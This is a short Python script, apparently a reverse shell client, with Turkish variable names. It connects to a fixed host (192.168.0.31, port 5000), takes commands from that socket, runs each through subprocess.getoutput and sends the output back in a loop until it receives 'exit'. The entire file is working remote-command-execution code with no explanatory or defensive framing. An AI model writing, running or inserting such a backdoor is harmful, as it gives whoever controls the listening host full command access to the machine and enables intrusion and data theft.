import socket
import subprocess
host="192.168.0.31"
port=5000
soket=socket.socket()
soket.connect((host,port))
mesaj=soket.recv(1024).decode()
print(mesaj)
while True:
    komut=soket.recv(1024).decode()
    if komut.lower() == "exit":
        break
    cikti = subprocess.getoutput(komut)
    soket.send(cikti.encode())
soket.close()